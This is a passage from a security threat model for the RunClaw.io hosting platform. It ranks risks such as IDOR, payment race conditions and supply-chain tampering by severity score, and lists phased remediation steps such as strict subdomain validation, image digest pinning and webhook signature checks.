| 7.3 | API key scope over-privilege | High | 8.5 | Data Store |
| 1.2 | IDOR on instance management endpoints | High | 8.2 | Control Plane |
| 8.3 | npm dependency poisoning | High | 8.1 | Supply Chain |
| 4.5 | Hetzner API token exposure via logs | High | 8.0 | VPS Provisioning |
| 7.1 | Appwrite permission model bypass | High | 8.0 | Data Store |
| 8.4 | Caddy image tampering | High | 7.9 | Supply Chain |
| 3.2 | Race condition: instance before payment | High | 7.8 | Payment Flow |
| 6.3 | SSH key management weaknesses | High | 7.8 | Customer VPS |
| 2.5 | OAuth redirect manipulation | High | 7.6 | Authentication |
| 2.1 | Appwrite session cookie security | High | 7.5 | Authentication |
| 6.2 | Caddy misconfiguration | High | 7.5 | Customer VPS |
| 2.4 | Password reset flow weaknesses | High | 7.4 | Authentication |
| 4.2 | Callback secret brute force/prediction | High | 7.3 | VPS Provisioning |
| 6.4 | Inter-instance network isolation | High | 7.2 | Customer VPS |
| 3.4 | Price manipulation via client-side plan | High | 7.1 | Payment Flow |
| 1.4 | Rate limiting absence | Medium | 6.5 | Control Plane |
| 5.5 | Wildcard certificate risks | Medium | 6.4 | DNS & Network |
| 3.3 | Subscription status check bypass | Medium | 6.2 | Payment Flow |
| 6.6 | Resource exhaustion | Medium | 6.0 | Customer VPS |
| 2.2 | Session fixation attacks | Medium | 5.9 | Authentication |
| 5.3 | Cloudflare proxy bypass | Medium | 5.8 | DNS & Network |
| 4.3 | MITM on callback URL | Medium | 5.7 | VPS Provisioning |
| 7.2 | Document-level permission escalation | Medium | 5.5 | Data Store |
| 4.4 | TOCTOU on subdomain validation | Medium | 5.4 | VPS Provisioning |
| 2.3 | Account enumeration | Medium | 5.3 | Authentication |
| 7.4 | Backup/export data exposure | Medium | 5.0 | Data Store |
| 5.4 | SSL/TLS downgrade attacks | Medium | 4.7 | DNS & Network |
| 5.2 | DNS cache poisoning | Low | 3.7 | DNS & Network |
| 3.5 | Idempotency key collision | Low | 3.5 | Payment Flow |
| 6.5 | Health check information disclosure | Low | 3.5 | Customer VPS |
| 1.5 | Cold start timing attacks | Low | 3.1 | Control Plane |

---

## Recommendations Priority

### Immediate (Week 1-2) -- Critical Severity

1. **Implement strict subdomain validation** (Section 4.1): Enforce `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` server-side before any cloud-init interpolation.
2. **Pin Docker image digests** (Section 8.1): Replace `:latest` with `@sha256:<digest>` in all provisioning templates.
3. **Add auth middleware to all API routes** (Section 1.1): Implement and enforce `withAuth()` wrapper across all `/api/*` routes.
4. **Verify Stripe webhook signatures** (Section 3.1): Ensure `stripe.webhooks.constructEvent()` is called with raw body and signature header.
5. **Implement IDOR checks** (Section 1.2): Add `instance.userId === session.userId` verification on every instance operation.
6. **Audit cloud-init template security** (Section 8.2): Review for any direct variable interpolation; switch to parameterized provisioning.

### Short-term (Week 3-4) -- High Severity

7. **Implement DNS record cleanup** (Section 5.1): Add retry logic and reconciliation job for orphaned DNS records.
8. **Harden Docker container security** (Section 6.1): Add `USER node`, drop capabilities, enable `no-new-privileges`.
9. **Scope Appwrite API keys** (Section 7.3): Create separate, minimally-scoped API keys for each operation type.
10. **Fix payment-provisioning race condition** (Section 3.2): Provision only on `invoice.payment_succeeded`, not `checkout.session.completed`.
11. **Harden Caddy configuration** (Section 6.2): Enforce explicit host matching, disable admin API on public interfaces.
12. **Implement SSH key isolation** (Section 6.3): Generate unique key pairs per instance; disable password auth.
13. **Restrict log output** (Section 4.5): Implement structured logging with automatic secret redaction.

### Medium-term (Month 2) -- Medium Severity

14. **Implement rate limiting** (Section 1.4): Add per-user rate limits on instance creation/deletion.
15. **Configure Cloudflare properly** (Sections 5.3, 5.4): Enable "Full (Strict)" SSL, HSTS, restrict origin to Cloudflare IPs.
16. **Add subscription reconciliation** (Section 3.3): Periodic job comparing Hetzner instances against Stripe subscriptions.
17. **Fix account enumeration** (Section 2.3): Standardize error messages across auth flows.
18. **Implement resource limits** (Section 6.6): Set Docker CPU/memory limits; block outbound SMTP.
19. **Audit Appwrite permissions** (Sections 7.1, 7.2): Review collection and document permissions; disable client-side permission setting.
20. **Implement VPS network isolation** (Section 6.4): Use Hetzner Cloud Firewalls to block inter-instance traffic.

### Long-term (Month 3+) -- Continuous Improvement

21. **Supply chain hardening** (Sections 8.3, 8.4): Implement SBOM, dependency monitoring, private registry mirroring.
22. **OAuth hardening** (Section 2.5): Enable PKCE, audit redirect URIs.
23. **Session security review** (Sections 2.1, 2.2): Verify cookie attributes, session regeneration, and fixation protections.
24. **Implement monitoring and alerting**: Deploy centralized logging, anomaly detection, and incident response procedures.
25. **Conduct penetration testing**: Engage a third-party firm to validate this analysis and test mitigations.

---

*This document should be reviewed and updated quarterly, or whenever significant architectural changes are made to the RunClaw.io platform.*
